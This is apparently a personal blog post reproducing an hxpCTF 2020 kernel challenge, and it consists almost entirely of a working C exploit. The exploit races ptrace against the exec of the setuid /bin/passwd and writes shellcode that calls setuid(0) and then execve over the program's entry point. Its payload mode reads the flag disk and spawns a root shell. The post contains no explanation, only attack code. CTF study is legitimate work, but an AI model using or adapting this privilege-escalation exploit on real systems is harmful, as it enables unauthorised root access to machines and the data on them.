---
title: 「hxpCTF2020」内核条件竞争复现
date: 2022-01-13 23:32:46
tags:
- Pwnable
categories:
- TECHNOLOGY
---


<!-- more -->

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <mman.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/arch/i386/regs.h>

#define ass(X) do { if (!(X)) { printf("failed @ %u\n", __LINE__); perror(#X); exit(1); } } while (0)

void child(volatile unsigned char *ready)
{

  ass(!unveil("/", "rwx"));

  for (unsigned i = 0; i < (1ul << 15); ++i) {
    char path[0x100];
    sprintf(path, "/tmp/yolo-%u", i);
    if (i % 100 == 0) { printf("%s\r", path); fflush(stdout); }
    ass(!unveil(path, "rwc"));
  }
  printf("\n");

  printf("child ready\n");

  {
    *ready = 1;             // continue parent
    while (*ready != 2);    // wait for attach
  }
  printf("child exec\n");

  usleep(100e3);

  char str0[] = "/bin/sh";
  char *argv[] = {str0, nullptr};
  char *envp[] = {nullptr};
  execve("/bin/passwd", argv, envp);
  printf("child %u\n", __LINE__);

}

unsigned addr_entry  = 0x08001ba6;  // entry point
unsigned addr_execve = 0x080327b5;  // libc execve
unsigned char payload[16] = {
  0x99,0xB0,0x31,0xCD,0x82,                               // setuid(0)
  0x58,0x58,0x58,0x50,0xFF,0x30,                          // push envp, push argv, push *argv
  0xE8,0x00,0x00,0x00,0x00,                               // call <off>
};
unsigned sentinel = 0xcccccccc;

static void prepare_shellcode()
{
  unsigned offoff = 12;
  * (unsigned*) (payload + offoff) = addr_execve - (addr_entry + offoff + 4);
}

static int set_priority(pid_t pid, int prio)
{
  sched_param sp = {prio};
  return sched_setparam(pid, &sp);
}

void parent(pid_t pid, volatile unsigned char *ready)
{

  set_priority( 0 , 1);
  set_priority(pid, 3);

  while (*ready != 1) sched_yield();  // wait for child
  ass(!ptrace(PT_ATTACH, pid, nullptr, 0));
  printf("parent attached\n");

  ass(!ptrace(PT_POKE, pid, (void*) addr_entry, sentinel));
  printf("wrote sentinel\n");

  set_priority( 0 , 3);
  set_priority(pid, 1);

  *ready = 2;             // continue child

  unsigned long cnt = 0;
  unsigned last_v = -1;

  while (true) {
    errno = 0;
    unsigned v = ptrace(PT_PEEK, pid, (void*) addr_entry, 0), w;
    int errv = errno;
    if (cnt % 1000 == 0 || v != last_v) { printf("%8lu %-2d %08x\n", cnt, errv, v); }

    if (errv == EACCES) {
      printf("PEEK ~> EACCES\n");
      break;
    }

    if (!errv && v != sentinel) {
      for (unsigned i = 0; i < (sizeof(payload)+3)/4; ++i) {
        w = ptrace(PT_POKE, pid, (void*) (addr_entry + 4*i), ((unsigned*) payload)[i]);
        printf("<%u> %-2d\n", i, w);
      }
      break;
    }

    last_v = v;

    if (++cnt % 1000 == 0) {
        ass(!ptrace(PT_CONTINUE, pid, nullptr, 0));
        sched_yield();
    }
  }
  ass(pid == waitpid(pid, nullptr, 0));
}

int main(int argc, char **argv) {
  if (argc >= 2 && !strcmp(argv[1], "payload")) {
    // read the flag
    int fd = open("/dev/hdb", O_RDONLY);
    printf("fd=%d\n", fd);

    char buf[0x401];
    for (unsigned i = 1; i < sizeof(buf); ++i) {
      lseek(fd, 0, SEEK_SET);
      errno = 0;
      int r = read(fd, buf, i);
      if (r != (signed) i) {
        printf("i=%d r=%d errno=%d\n", i, r, errno);
        break;
      }
    }
    printf("\n--> \x1b[32m%s\x1b[0m\n", buf);
    execl("/bin/sh", "sh", nullptr);
    exit(0);
  }
  prepare_shellcode();

  unsigned char *ready;
  {
    void *page = mmap(nullptr, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    ass(page != MAP_FAILED);
    ready = (unsigned char*) page;
  }
  *ready = 0;

  pid_t pid = fork();
  ass(pid >= 0);
  if (pid > 0)
    parent(pid, ready);
  else
    child(ready);

}
```
